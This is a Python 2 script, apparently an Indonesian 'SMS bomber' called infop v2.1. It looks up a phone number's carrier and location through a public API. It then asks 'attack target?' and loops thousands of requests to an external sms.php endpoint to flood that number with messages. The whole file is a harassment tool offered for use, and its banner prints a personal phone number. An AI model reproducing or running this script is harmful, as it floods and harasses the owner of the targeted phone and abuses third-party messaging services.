#!/usr/bin/python2
# -*- coding: UTF-8 -*-.
# [ Coding By lao'neis agung ]
import requests,json,os
# warna <--->
p = '\x1b[0m'
m = '\x1b[91m'
i = '\x1b[92m'
k = '\x1b[93m'
b = '\x1b[94m'
u = '\x1b[95m'
bm = '\x1b[96m'
bgm = '\x1b[41m'
bgp = '\x1b[47m'
res = '\x1b[40m'
# =
class vam_(object):
	def js(self):
		os.system("clear")
		#thanks To Lao'neis agung
		self._link = "http://api.antideo.com/phone/id/{}"
		self._lfa = 0
		print "\n         \x1b[34m\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\n           \x1b[31m\xe2\x8f\xa3 \x1b[32mAuthor   \x1b[37m: SLao'neis agung\n           \x1b[31m\xe2\x8f\xa3 \x1b[32mMy Team  \x1b[37m: Net cyber team\n           \x1b[31m\xe2\x8f\xa3 \x1b[32mwhatsapp \x1b[37m: 089655478810\n           \x1b[31m\xe2\x8f\xa3 \x1b[32mCodeName \x1b[37m: \x1b[36minfop \x1b[0;1mv2.1\n         \x1b[34m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\n"
		self.ph = []
		self._ = 'https://sinafipika.000webhostapp.com/sms.php/sms.php?nomor={}&paket={}'
		self.in_ = str(raw_input("%s[%s+%s] %sInput Number : %s"%(b,m,b,p,i)))
	def _modflush(self):
		self.yui_ = requests.get
		self.tusb = self.yui_(self._link.format(self.in_))
		print self.tusb
		#print self.tusb
		self._jsn = json.loads(self.tusb.text)
	def data(self):
		print "[✤] phone : "+str(self._jsn["phone"])
		self.ph.append(self._jsn["phone"])
		print "[✤] valid : "+str(self._jsn["valid"])
		print "[✤] type : "+str(self._jsn["type"])
		print "[✤] location : "+str(self._jsn["location"][:51])
		print "[✤] carrier : "+str(self._jsn["carrier"])
		print "[✤] timezones : "+str(self._jsn["timezones"])
		print "[✤] E164 : "+str(self._jsn["formats"]["national"])
		print "[✤] national : "+str(self._jsn["formats"]["international"])
		print "[✤] international : "+str(self._jsn["formats"]["E164"])
		print "[✯] Oky !"
	def _nac(self):
		_num = self.ph
		print "⚚ Serang Target ? "
		raw_input("[-] Input >> ")
		while self._lfa < range(9999):
			self._lfa += 1
			self._yosh = self.yui_(self._.format(str(_num),str(self._lfa)))
			if "error" in self._yosh.text:
				print "[⏣] error... %s > %s"%(str(self._lfa),str(self._jsn["phone"]))
			else:
				print "[⏣] Sending... %s > %s"%(str(self._lfa),str(self._jsn["phone"]))
def _main():
	try:
		ha = vam_()
		ns = ha.js()
		ns = ha._modflush()
		print i+'\xe2\x96\x82'*40+p
		ns = ha.data()
		print i+'\xe2\x96\x82'*40+p
		ns = ha._nac()
	except:
		exit("%s[%s!%s] %soky"%(b,m,b,p))
if __name__ == "__main__":
	_main()
